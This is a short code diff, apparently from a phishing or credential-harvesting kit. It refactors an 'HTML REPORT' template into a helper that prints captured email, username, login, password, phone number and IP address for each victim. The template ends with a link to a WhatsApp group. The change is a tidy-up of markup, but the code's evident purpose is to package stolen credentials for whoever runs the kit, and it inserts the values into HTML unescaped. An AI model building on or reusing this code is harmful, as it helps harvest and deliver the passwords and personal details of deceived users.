@@ -126,7 +126,23 @@ function getIP(req) {
     "-"
   );
 }
+function row(label, value) {
+  if (
+    value === undefined ||
+    value === null ||
+    value === "" ||
+    value === "-"
+  ) {
+    return "";
+  }
 
+  return `
+    <div class="row">
+        <span class="label">${label}</span>
+        <span class="value">${value}</span>
+    </div>
+  `;
+}
 /* ======================
    HTML REPORT
 ====================== */
@@ -290,37 +306,14 @@ body{
 
     <div class="table">
 
-        <div class="row">
-            <span class="label">EMAIL</span>
-            <span class="value">${vars.email}</span>
-        </div>
+    ${row("EMAIL", vars.email)}
+    ${row("USER", vars.user)}
+    ${row("LOGIN", vars.login)}
+    ${row("PASSWORD", vars.password)}
+    ${row("PHONE", vars.phone)}
+    ${row("IP ADDRESS", vars.ip)}
 
-        <div class="row">
-            <span class="label">USER</span>
-            <span class="value">${vars.user}</span>
-        </div>
-
-        <div class="row">
-            <span class="label">LOGIN</span>
-            <span class="value">${vars.login}</span>
-        </div>
-
-        <div class="row">
-            <span class="label">PASSWORD</span>
-            <span class="value">${vars.password}</span>
-        </div>
-
-        <div class="row">
-            <span class="label">PHONE</span>
-            <span class="value">${vars.phone}</span>
-        </div>
-
-        <div class="row">
-            <span class="label">IP ADDRESS</span>
-            <span class="value">${vars.ip}</span>
-        </div>
-
-    </div>
+</div>
 
     <div class="join-box">
         <a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=4&amv=3"
